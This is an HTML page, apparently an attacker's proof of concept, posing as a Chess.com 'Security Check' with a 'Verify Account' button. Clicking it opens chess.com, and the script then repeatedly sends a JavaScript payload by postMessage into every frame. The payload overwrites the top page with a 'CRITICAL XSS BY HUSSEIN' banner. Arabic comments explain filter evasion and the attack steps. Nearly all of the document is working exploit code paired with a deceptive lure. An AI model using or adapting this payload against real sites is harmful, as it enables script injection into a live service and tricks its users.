<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Chess.com Account Verification</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 100px; background-color: #f4f4f4;}
        button { padding: 15px 30px; font-size: 20px; background-color: #3182ce; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background-color: #2b6cb0; }
    </style>
</head>
<body>
    <h1>Chess.com Security Check</h1>
    <p>Please click the button below to verify your account session.</p>
    
    <button onclick="startAttack()">Verify Account</button>

    <script>
        // الـ Payload المرعب: بيطلع للصفحة الرئيسية ويمسحها ويحط رسالة الاختراق
        let payload = `
            try {
                window.top.document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:999999;color:white;font-size:50px;font-weight:bold;text-align:center;padding-top:20%;">CRITICAL XSS BY HUSSEIN</div>';
            } catch(e) {}
            // get_3p
        `.replace(/\n/g, ''); // بنشيل السطور الجديدة عشان الفلتر

        let spammer;

        // دالة الضرب العنقودي
        function blastFrames(win) {
            try {
                win.postMessage(payload, "*");
            } catch(e) {}
            
            try {
                for (let i = 0; i < win.length; i++) {
                    blastFrames(win[i]);
                }
            } catch(e) {}
        }

        // بدء الهجوم
        function startAttack() {
            // 1. فتح Chess.com
            let victimWin = window.open("https://www.chess.com", "victimWindow");

            // 2. نستنى 4 ثواني عشان الإعلانات تحمل
            setTimeout(() => {
                console.log("Starting the blast...");
                
                // 3. سبام كل 10 ملي ثانية
                spammer = setInterval(() => {
                    if(victimWin) {
                        blastFrames(victimWin);
                    }
                }, 10);

                // 4. نوقف بعد ثانيتين
                setTimeout(() => {
                    clearInterval(spammer);
                    console.log("Blasting finished.");
                }, 2000);

            }, 4000);
        }
    </script>
</body>
</html>
